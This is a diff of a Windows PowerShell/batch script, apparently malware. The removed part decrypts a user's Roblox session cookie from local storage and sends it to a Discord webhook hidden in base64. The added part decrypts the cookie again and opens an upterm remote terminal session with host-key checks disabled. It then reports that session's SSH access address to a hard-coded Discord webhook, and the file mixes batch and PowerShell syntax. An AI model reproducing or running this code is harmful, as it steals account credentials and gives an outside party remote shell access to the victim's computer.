@@ -1,55 +1,25 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
-# 1. Retrieve Roblox Token
-$p = "$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"
-$cookie = "Roblox Not Found"
+# 0.5 取得token
+$p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; if(Test-Path $p){ [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); $s=[Text.Encoding]::UTF8.GetString($d); if($s -match '(_\|WARNING.*?)(;|$)'){$cookie=$matches[1]; $cookie} }else{"Roblox Not Found"}
 
-if (Test-Path $p) {
-    try {
-        [void][Reflection.Assembly]::LoadWithPartialName('System.Security')
-        $j = (Get-Content $p -Raw | ConvertFrom-Json).CookiesData
-        $d = [Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j), $null, 'CurrentUser')
-        $s = [Text.Encoding]::UTF8.GetString($d)
-        if ($s -match '(_\|WARNING.*?)(;|$)') {
-            $cookie = $matches[1]
-        }
-    } catch {
-        $cookie = "Error Decrypting Cookie"
-    }
-}
+:: 1. 設定 Webhook URL
+set "WEBHOOK=https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"
 
-# 2. Base64 Encoded Config (URL and Embed Text)
-$b64_uri = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMTUyMzI1NDQwNDE5MDIwOS9xbmZUYllnZk51T0NPQmJFcXd1TUhIallDbHRxZ004aVFrcEN5ME5GVmFTMTRvUm1LcWZ5c0lRdGthdXc0WUZnR2V6"
-$b64_title = "5paw55qEcm9ibG94IGNvb2tpZeaOpeWUtg=="
-$b64_footer = "5Y+v5Lul55uh5oOF5L2/55So"
+:: 2. Base64 編碼的 JSON 模板 (內含標題、顏色、Fields 與 Footer)
+set "B64=ewoiZW1iZWRzIjogWwogICAgewogICAgICAgICJ0aXRsZSI6ICLmlrAgU1NIIOWPr+mnreWFpSIsCiAgICAgICAgImNvbG9yIjogMTY3MTE2ODAsCiAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIm5hbWUiOiAi542o54m5VVVJRCIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiAiYGBge3V1aWR9YGBgIiwKICAgICAgICAgICAgICAgICJpbmxpbmUiOiB0cnVlCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIuWPr+mAo+e3mlNTSCIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiAiYGBge3NzaH1gYGAiLAogICAgICAgICAgICAgICAgImlubGluZSI6IGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICJ0ZXh0IjogIjog5oiR5L6G5ris6Kmm5q2kc3No5piv5ZCm5Y+v55SoIiwKICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMTQ5NDc1MzM5NjQ4MDI4MjcyNC9lM2U3NDQzMWZmNzJiOGQ0NjA3N2UwZDI0OTJjNzBkMy5wbmc/c2l6ZT0xMDI0IgogICAgICAgIH0KICAgIH0KXQp9"
 
-# 3. Decode function
-function Decode-String($base64) {
-    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
-}
-
-# 4. Prepare Payload
-$uri = Decode-String $b64_uri
-$payload = @{
-    embeds = @(
-        @{
-            title = Decode-String $b64_title
-            color = 3447003
-            fields = @(
-                @{
-                    name  = "cookie"
-                    value = "```$cookie```"
-                }
-            )
-            footer = @{
-                text = Decode-String $b64_footer
-            }
-        }
-    )
-}
-
-# 5. Convert and Send
-$json = $payload | ConvertTo-Json -Depth 10
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
-
-Invoke-RestMethod -Uri $uri -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
+:: 3. 執行 PowerShell 處理邏輯
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "$uuid = [guid]::NewGuid().ToString(); ^
+    $jsonTemplate = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%B64%')); ^
+    upterm host --accept --skip-host-key-check 2>&1 | ForEach-Object { ^
+        Write-Host $_; ^
+        if ($_ -match 'ssh\s+\S+@\S+') { ^
+            $sshAddr = $Matches[0]; ^
+            $payload = $jsonTemplate.Replace('{uuid}', $uuid).Replace('{ssh}', $sshAddr); ^
+            $bytePayload = [Text.Encoding]::UTF8.GetBytes($payload); ^
+            Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $bytePayload -ContentType 'application/json; charset=utf-8'; ^
+            Write-Host '>>> Discord 通知已發送'; ^
+        } ^
+    }"
